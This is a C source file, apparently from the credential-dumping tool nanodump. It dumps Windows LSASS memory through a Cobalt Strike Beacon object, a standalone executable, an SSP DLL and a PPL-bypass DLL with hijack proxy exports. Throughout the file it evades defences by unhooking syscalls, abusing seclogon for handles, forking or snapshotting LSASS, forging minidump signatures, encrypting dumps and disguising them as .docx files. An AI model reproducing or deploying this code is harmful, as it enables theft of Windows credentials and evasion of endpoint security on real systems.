#include "entry.h"

#ifdef BOF
 #include "nanodump.c"
#else
 #include "nanodump.h"
#endif

#if defined(NANO) && defined(BOF)

void go(char* args, int length)
{
    dump_context   dc;
    datap          parser;
    DWORD          lsass_pid;
    LPCSTR         dump_path;
    BOOL           write_dump_to_disk;
    BOOL           fork_lsass;
    BOOL           snapshot_lsass;
    BOOL           duplicate_handle;
    BOOL           use_valid_sig;
    BOOL           success;
    BOOL           get_pid_and_leave;
    BOOL           use_malseclogon;
    LPCSTR         malseclogon_target_binary = NULL;
    wchar_t        wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;
    HANDLE         hSnapshot;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    BeaconDataParse(&parser, args, length);
    lsass_pid = BeaconDataInt(&parser);
    dump_path = BeaconDataExtract(&parser, NULL);
    write_dump_to_disk = (BOOL)BeaconDataInt(&parser);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    fork_lsass = (BOOL)BeaconDataInt(&parser);
    snapshot_lsass = (BOOL)BeaconDataInt(&parser);
    duplicate_handle = (BOOL)BeaconDataInt(&parser);
    get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
    use_malseclogon = (BOOL)BeaconDataInt(&parser);
    malseclogon_target_binary = BeaconDataExtract(&parser, NULL);

    if (write_dump_to_disk)
    {
        get_full_path(&full_dump_path, dump_path);
        if (!create_file(&full_dump_path))
            return;
    }

    remove_syscall_callback_hook();

    // if not provided, get the PID of LSASS
    if (!lsass_pid)
    {
        lsass_pid = get_lsass_pid();
        if (!lsass_pid)
            return;
    }
    else
    {
        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
    }

    if (get_pid_and_leave)
    {
        PRINT(LSASS " PID: %ld", lsass_pid);
        return;
    }

    success = enable_debug_priv();
    if (!success)
        return;

    BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
    BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
    PPROCESS_LIST created_processes = NULL;

    if (use_malseclogon)
    {
        success = MalSecLogon(
            malseclogon_target_binary,
            dump_path,
            fork_lsass,
            snapshot_lsass,
            use_valid_sig,
            use_malseclogon_locally,
            lsass_pid,
            &created_processes);
        // delete the uploaded nanodump binary
        if (use_malseclogon_locally)
            delete_file(malseclogon_target_binary);
        if (!success)
            return;
        if (use_malseclogon_locally)
            return;
    }

    // set the signature
    if (use_valid_sig)
    {
        DPRINT("Using a valid signature");
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        DPRINT("Using a invalid signature");
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
    // if we used MalSecLogon remotely, the handle won't have PROCESS_CREATE_PROCESS;
    if ((fork_lsass || snapshot_lsass) && !use_malseclogon_remotely)
    {
        permissions = LSASS_CLONE_PERMISSIONS;
    }

    HANDLE hProcess = obtain_lsass_handle(
        lsass_pid,
        permissions,
        duplicate_handle,
        FALSE,
        dump_path);
    if (!hProcess)
        return;

    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
    if ((fork_lsass || snapshot_lsass) && use_malseclogon)
    {
        hProcess = make_handle_full_access(
            hProcess);
        if (!hProcess)
            return;
    }

    // avoid reading LSASS directly by making a fork
    if (fork_lsass)
    {
        hProcess = fork_process(
            hProcess);
        if (!hProcess)
            return;
    }

    // avoid reading LSASS directly by making a snapshot
    if (snapshot_lsass)
    {
        hProcess = snapshot_process(
            hProcess,
            &hSnapshot);
        if (!hProcess)
            return;
    }

    // allocate a chuck of memory to write the dump
    SIZE_T region_size = DUMP_MAX_SIZE;
    PVOID base_address = allocate_memory(&region_size);
    if (!base_address)
    {
        NtClose(hProcess); hProcess = NULL;
        if (write_dump_to_disk)
            delete_file(dump_path);
        return;
    }

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);

    // kill the clone of the LSASS process
    if (fork_lsass)
    {
        kill_process(
            0,
            hProcess);
    }

    // close the handle
    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;

    // free the created snapshot
    if (snapshot_lsass)
    {
        free_snapshot(
            hSnapshot);
        hSnapshot = NULL;
    }

    // if we used MalSecLogon remotely, kill the created processes
    if (use_malseclogon_remotely)
    {
        kill_created_processes(created_processes);
        intFree(created_processes); created_processes = NULL;
    }

    if (!success)
    {
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
        if (write_dump_to_disk)
            delete_file(dump_path);
        return;
    }

    DPRINT(
        "The dump was created successfully, final size: %d MiB",
        (dc.rva/1024)/1024);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(
        dc.BaseAddress,
        dc.rva);

    if (write_dump_to_disk)
    {
        success = write_file(
            &full_dump_path,
            dc.BaseAddress,
            dc.rva);
    }
    else
    {
        success = download_file(
            dump_path,
            dc.BaseAddress,
            dc.rva);
    }
    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);

    if (!success)
    {
        if (write_dump_to_disk)
            delete_file(dump_path);
        return;
    }

    print_success(
        dump_path,
        use_valid_sig,
        write_dump_to_disk);
}

#elif defined(NANO) && defined(EXE)

void usage(char* procname)
{
    PRINT("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
    PRINT("    --getpid");
    PRINT("            print the PID of " LSASS " and leave");
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("    --fork, -f");
    PRINT("            fork the target process before dumping");
    PRINT("    --snapshot, -s");
    PRINT("            snapshot the target process before dumping");
    PRINT("    --dup, -d");
    PRINT("            duplicate an existing " LSASS " handle");
    PRINT("    --malseclogon, -m");
    PRINT("            obtain a handle to " LSASS " by (ab)using seclogon");
    PRINT("    --binary BIN_PATH, -b BIN_PATH");
    PRINT("            full path to the decoy binary used with --dup and --malseclogon");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    dump_context   dc;
    DWORD          lsass_pid                 = 0;
    BOOL           fork_lsass                = FALSE;
    BOOL           snapshot_lsass            = FALSE;
    BOOL           duplicate_handle          = FALSE;
    LPCSTR         dump_path                 = NULL;
    BOOL           success                   = TRUE;
    BOOL           use_valid_sig             = FALSE;
    BOOL           get_pid_and_leave         = FALSE;
    BOOL           use_malseclogon           = FALSE;
    BOOL           is_malseclogon_stage_2    = FALSE;
    LPCSTR         malseclogon_target_binary = NULL;
    wchar_t        wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;
    HANDLE         hSnapshot;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return -1;
    }
#endif

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "--getpid", 9))
        {
            get_pid_and_leave = TRUE;
        }
        else if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return -1;
            }
            dump_path = argv[++i];
            get_full_path(&full_dump_path, dump_path);
        }
        else if (!strncmp(argv[i], "-p", 3) ||
                 !strncmp(argv[i], "--pid", 6))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --pid value");
                return -1;
            }
            i++;
            lsass_pid = atoi(argv[i]);
            if (!lsass_pid ||
                strspn(argv[i], "0123456789") != strlen(argv[i]))
            {
                PRINT("Invalid PID: %s", argv[i]);
                return -1;
            }
        }
        else if (!strncmp(argv[i], "-f", 3) ||
                 !strncmp(argv[i], "--fork", 7))
        {
            fork_lsass = TRUE;
        }
        else if (!strncmp(argv[i], "-s", 3) ||
                 !strncmp(argv[i], "--snapshot", 11))
        {
            snapshot_lsass = TRUE;
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--dup", 6))
        {
            duplicate_handle = TRUE;
        }
        else if (!strncmp(argv[i], "-m", 3) ||
                 !strncmp(argv[i], "--malseclogon", 14))
        {
            use_malseclogon = TRUE;
        }
        else if (!strncmp(argv[i], "-s2", 4) ||
                 !strncmp(argv[i], "--stage2", 9))
        {
            is_malseclogon_stage_2 = TRUE;
        }
        else if (!strncmp(argv[i], "-b", 3) ||
                 !strncmp(argv[i], "--binary", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --binary value");
                return -1;
            }
            malseclogon_target_binary = argv[++i];
            if (!strrchr(malseclogon_target_binary, '\\'))
            {
                PRINT("You must provide a full path: %s", malseclogon_target_binary);
                return -1;
            }
            if (!file_exists(malseclogon_target_binary))
            {
                PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
                return -1;
            }
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return -1;
        }
    }

    if (!full_dump_path.Length && !get_pid_and_leave)
    {
        usage(argv[0]);
        return -1;
    }

    if (use_malseclogon && !duplicate_handle && !is_full_path(dump_path))
    {
        PRINT("If MalSecLogon is being used locally, you need to provide the full path: %s", dump_path);
        return -1;
    }

    if (fork_lsass && snapshot_lsass)
    {
        PRINT("The options --fork and --snapshot cannot be used at the same time");
        return -1;
    }

    remove_syscall_callback_hook();

    // if not provided, get the PID of LSASS
    if (!lsass_pid)
    {
        lsass_pid = get_lsass_pid();
        if (!lsass_pid)
            return -1;
    }
    else
    {
        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
    }

    if (get_pid_and_leave)
    {
        PRINT(LSASS " PID: %ld", lsass_pid);
        return 0;
    }

    if (!full_dump_path.Length)
    {
        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
        usage(argv[0]);
        return -1;
    }

    if (duplicate_handle && use_malseclogon && !malseclogon_target_binary)
    {
        PRINT("If --dup and --malseclogon are used, you need to provide a binary with --binary");
        return -1;
    }

    if ((!duplicate_handle || !use_malseclogon) && malseclogon_target_binary)
    {
        PRINT("The option --binary can only be used with --malseclogon and --dup");
        return -1;
    }

    success = enable_debug_priv();
    if (!success)
        return -1;

    if (use_malseclogon && !malseclogon_target_binary)
        malseclogon_target_binary = argv[0];

    BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
    BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
    BOOL is_malseclogon_stage_1 = use_malseclogon && !is_malseclogon_stage_2;
    PPROCESS_LIST created_processes = NULL;

    if (!is_malseclogon_stage_2)
    {
        if (!create_file(&full_dump_path))
            return -1;
    }

    if (is_malseclogon_stage_1)
    {
        success = MalSecLogon(
            malseclogon_target_binary,
            dump_path,
            fork_lsass,
            snapshot_lsass,
            use_valid_sig,
            use_malseclogon_locally,
            lsass_pid,
            &created_processes);
        if (!success)
            return -1;
        if (use_malseclogon_locally)
            return 0;
    }

    // set the signature
    if (use_valid_sig)
    {
        DPRINT("Using a valid signature");
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        DPRINT("Using a invalid signature");
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
    if ((fork_lsass || snapshot_lsass) && !use_malseclogon_remotely)
    {
        permissions = LSASS_CLONE_PERMISSIONS;
    }

    HANDLE hProcess = obtain_lsass_handle(
        lsass_pid,
        permissions,
        duplicate_handle,
        is_malseclogon_stage_2,
        dump_path);
    if (!hProcess)
        return -1;

    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
    if ((fork_lsass || snapshot_lsass) && use_malseclogon)
    {
        hProcess = make_handle_full_access(
            hProcess);
        if (!hProcess)
            return -1;
    }

    // avoid reading LSASS directly by making a fork
    if (fork_lsass)
    {
        hProcess = fork_process(
            hProcess);
        if (!hProcess)
            return -1;
    }

    // avoid reading LSASS directly by making a snapshot
    if (snapshot_lsass)
    {
        hProcess = snapshot_process(
            hProcess,
            &hSnapshot);
        if (!hProcess)
            return -1;
    }

    // allocate a chuck of memory to write the dump
    SIZE_T region_size = DUMP_MAX_SIZE;
    PVOID base_address = allocate_memory(&region_size);
    if (!base_address)
    {
        NtClose(hProcess); hProcess = NULL;
        delete_file(dump_path);
        return -1;
    }

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);

    // kill the clone of the LSASS process
    if (fork_lsass)
    {
        kill_process(
            0,
            hProcess);
    }

    // close the handle
    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;

    // free the created snapshot
    if (snapshot_lsass)
    {
        free_snapshot(
            hSnapshot);
        hSnapshot = NULL;
    }

    // if we used MalSecLogon remotely, kill the created processes
    if (use_malseclogon_remotely)
    {
        kill_created_processes(created_processes);
        intFree(created_processes); created_processes = NULL;
    }

    if (!success)
    {
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
        delete_file(dump_path);
        return -1;
    }

    DPRINT(
        "The dump was created successfully, final size: %d MiB",
        (dc.rva/1024)/1024);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(
        dc.BaseAddress,
        dc.rva);

    success = write_file(
        &full_dump_path,
        dc.BaseAddress,
        dc.rva);

    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);

    if (!success)
    {
        delete_file(dump_path);
        return -1;
    }

    if (!is_malseclogon_stage_2)
    {
        print_success(
            dump_path,
            use_valid_sig,
            TRUE);
    }
    return 0;
}

#elif defined(NANO) && defined(SSP)

#include "ssp.h"

BOOL NanoDumpSSP(void)
{
    /******************* change this *******************/
    LPCSTR dump_path     = "C:\\Windows\\Temp\\report.docx";
    BOOL   use_valid_sig = FALSE;
    /***************************************************/

    dump_context   dc;
    BOOL           success;
    wchar_t        wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    get_full_path(&full_dump_path, dump_path);

    if (!create_file(&full_dump_path))
        return FALSE;

    // set the signature
    if (use_valid_sig)
    {
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    // we are LSASS after all :)
    HANDLE hProcess = NtCurrentProcess();

    // allocate a chuck of memory to write the dump
    SIZE_T region_size = DUMP_MAX_SIZE;
    PVOID base_address = allocate_memory(&region_size);
    if (!base_address)
    {
        delete_file(dump_path);
        return FALSE;
    }

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);
    if (!success)
    {
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
        delete_file(dump_path);
        return FALSE;
    }

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(
        dc.BaseAddress,
        dc.rva);

    success = write_file(
        &full_dump_path,
        dc.BaseAddress,
        dc.rva);

    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);

    if (!success)
    {
        delete_file(dump_path);
        return FALSE;
    }

    return TRUE;
}

__declspec(dllexport) BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            NanoDumpSSP();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return FALSE;
}

#elif defined(NANO) && defined(PPL)

#include "ppl/cleanup.h"

BOOL NanoDumpPPL(VOID)
{
    dump_context   dc;
    BOOL           bReturnValue      = FALSE;
    HANDLE         hProcess          = NULL;
    DWORD          lsass_pid         = 0;
    BOOL           fork_lsass        = FALSE;
    BOOL           snapshot_lsass    = FALSE;
    BOOL           duplicate_handle  = FALSE;
    BOOL           success           = TRUE;
    BOOL           use_valid_sig     = FALSE;
    BOOL           use_malseclogon   = FALSE;
    BOOL           binary_provided   = FALSE;
    PPROCESS_LIST  created_processes = NULL;
    HANDLE         hSnapshot         = NULL;
    SIZE_T         region_size       = 0;
    PVOID          base_address      = NULL;
    CHAR           dump_path[MAX_PATH];
    CHAR           malseclogon_target_binary[MAX_PATH];
    WCHAR          wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return FALSE;
    }
#endif

    //remove_syscall_callback_hook();

    success = delete_known_dll_entry();
    if (!success)
        goto end;

    CommandLineToArgvW_t CommandLineToArgvW;
    CommandLineToArgvW = (CommandLineToArgvW_t)(ULONG_PTR)get_function_address(
        get_library_address(SHELL32_DLL, TRUE),
        CommandLineToArgvW_SW2_HASH,
        0);
    if (!CommandLineToArgvW)
    {
        DPRINT_ERR("Address of 'CommandLineToArgvW' not found");
        goto end;
    }
    GetCommandLineW_t GetCommandLineW;
    GetCommandLineW = (GetCommandLineW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetCommandLineW_SW2_HASH,
        0);
    if (!GetCommandLineW)
    {
        DPRINT_ERR("Address of 'GetCommandLineW' not found");
        goto end;
    }

    LPWSTR* argv = NULL;
    int argc = 0;
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv || !argc)
        goto end;

    for (int i = 1; i < argc; ++i)
    {
        if (!_wcsicmp(argv[i], L"-v") ||
            !_wcsicmp(argv[i], L"--valid"))
        {
            use_valid_sig = TRUE;
        }
        else if (!_wcsicmp(argv[i], L"-w") ||
                 !_wcsicmp(argv[i], L"--write"))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                goto end;
            }
            wcstombs(dump_path, argv[++i], MAX_PATH);
            get_full_path(&full_dump_path, dump_path);
        }
        else if (!_wcsicmp(argv[i], L"-p") ||
                 !_wcsicmp(argv[i], L"--pid"))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --pid value");
                goto end;
            }
            i++;
            lsass_pid = wcstoul(argv[i], NULL, 10);
        }
        else if (!_wcsicmp(argv[i], L"-f") ||
                 !_wcsicmp(argv[i], L"--fork"))
        {
            fork_lsass = TRUE;
        }
        else if (!_wcsicmp(argv[i], L"-s") ||
                 !_wcsicmp(argv[i], L"--snapshot"))
        {
            snapshot_lsass = TRUE;
        }
        else if (!_wcsicmp(argv[i], L"-d") ||
                 !_wcsicmp(argv[i], L"--dup"))
        {
            duplicate_handle = TRUE;
        }
        else if (!_wcsicmp(argv[i], L"-m") ||
                 !_wcsicmp(argv[i], L"--malseclogon"))
        {
            use_malseclogon = TRUE;
        }
        else if (!_wcsicmp(argv[i], L"-b") ||
                 !_wcsicmp(argv[i], L"--binary"))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --binary value");
                goto end;
            }
            wcstombs(malseclogon_target_binary, argv[++i], MAX_PATH);
            binary_provided = TRUE;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            goto end;
        }
    }

    LocalFree(argv); argv = NULL;

    if (!full_dump_path.Length)
        goto end;

    if (fork_lsass && snapshot_lsass)
    {
        PRINT("The options --fork and --snapshot cannot be used at the same time");
        goto end;
    }

    if (use_malseclogon && (fork_lsass || snapshot_lsass))
    {
        PRINT("In this mode, MalSecLogon cannot be used with --fork or --snapshot.");
        goto end;
    }

    if (use_malseclogon && !duplicate_handle)
    {
        PRINT("In this mode, if MalSecLogon is being used, --dup must be provided.");
        goto end;
    }

    if (use_malseclogon && !binary_provided)
    {
        PRINT("In this mode, if MalSecLogon is being used, --binary must be provided.");
        goto end;
    }

    if (binary_provided &&
        !is_full_path(malseclogon_target_binary))
    {
        PRINT("You need to provide the full path: %s", malseclogon_target_binary);
        goto end;
    }

    if (binary_provided &&
        !file_exists(malseclogon_target_binary))
    {
        PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
        goto end;
    }

    // if not provided, get the PID of LSASS
    if (!lsass_pid)
    {
        lsass_pid = get_lsass_pid();
        if (!lsass_pid)
            goto end;
    }
    else
    {
        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
    }

    if (!full_dump_path.Length)
    {
        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
        goto end;
    }

    success = enable_debug_priv();
    if (!success)
        goto end;

    if (!create_file(&full_dump_path))
        goto end;

    if (use_malseclogon)
    {
        success = MalSecLogon(
            malseclogon_target_binary,
            dump_path,
            fork_lsass,
            snapshot_lsass,
            use_valid_sig,
            FALSE,
            lsass_pid,
            &created_processes);
        if (!success)
            goto end;
    }

    // set the signature
    if (use_valid_sig)
    {
        DPRINT("Using a valid signature");
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        DPRINT("Using a invalid signature");
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
    if ((fork_lsass || snapshot_lsass) && !use_malseclogon)
    {
        permissions = LSASS_CLONE_PERMISSIONS;
    }

    hProcess = obtain_lsass_handle(
        lsass_pid,
        permissions,
        duplicate_handle,
        FALSE,
        dump_path);
    if (!hProcess)
        goto end;

    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
    if ((fork_lsass || snapshot_lsass) && use_malseclogon)
    {
        hProcess = make_handle_full_access(
            hProcess);
        if (!hProcess)
            goto end;
    }

    // avoid reading LSASS directly by making a fork
    if (fork_lsass)
    {
        hProcess = fork_process(
            hProcess);
        if (!hProcess)
            goto end;
    }

    // avoid reading LSASS directly by making a snapshot
    if (snapshot_lsass)
    {
        hProcess = snapshot_process(
            hProcess,
            &hSnapshot);
        if (!hProcess)
            goto end;
    }

    // allocate a chuck of memory to write the dump
    region_size = DUMP_MAX_SIZE;
    base_address = allocate_memory(&region_size);
    if (!base_address)
        goto end;

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);

    // kill the clone of the LSASS process
    if (fork_lsass)
    {
        kill_process(
            0,
            hProcess);
    }

    if (!success)
        goto end;

    DPRINT(
        "The dump was created successfully, final size: %d MiB",
        (dc.rva/1024)/1024);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(
        dc.BaseAddress,
        dc.rva);

    success = write_file(
        &full_dump_path,
        dc.BaseAddress,
        dc.rva);

    if (!success)
        goto end;

    bReturnValue = TRUE;

end:
    if (argv)
        LocalFree(argv);
    if (base_address && region_size)
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
    if (hProcess)
        NtClose(hProcess);
    if (hSnapshot)
        free_snapshot(hSnapshot);
    if (!bReturnValue)
        delete_file(dump_path);
    if (created_processes)
    {
        kill_created_processes(created_processes);
        intFree(created_processes);
    }

    return bReturnValue;
}

__declspec(dllexport) BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            NanoDumpPPL();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// Windows 8.1 -> SspiCli.dll
//
//   000000014005B1C8  LogonUserExExW SspiCli
//
void APIENTRY LogonUserExExW() {};

//
// Windows 10 -> EventAggregation.dll
//
//   0000000140083728  EaDeleteAggregatedEvent EventAggregation
//   0000000140083730  BriCreateBrokeredEvent EventAggregation
//   0000000140083738  EaCreateAggregatedEvent EventAggregation
//   0000000140083740  BriDeleteBrokeredEvent EventAggregation
//   0000000140083748  EACreateAggregateEvent EventAggregation
//   0000000140083750  EaQueryAggregatedEventParameters EventAggregation
//   0000000140083758  EaFreeAggregatedEventParameters EventAggregation
//   0000000140083760  EADeleteAggregateEvent EventAggregation
//   0000000140083768  EAQueryAggregateEventData EventAggregation
void APIENTRY BriCreateBrokeredEvent() {};
void APIENTRY BriDeleteBrokeredEvent() {};
void APIENTRY EaCreateAggregatedEvent() {};
void APIENTRY EACreateAggregateEvent() {};
void APIENTRY EaQueryAggregatedEventParameters() {};
void APIENTRY EAQueryAggregateEventData() {};
void APIENTRY EaFreeAggregatedEventParameters() {};
void APIENTRY EaDeleteAggregatedEvent() {};
void APIENTRY EADeleteAggregateEvent() {};

#endif
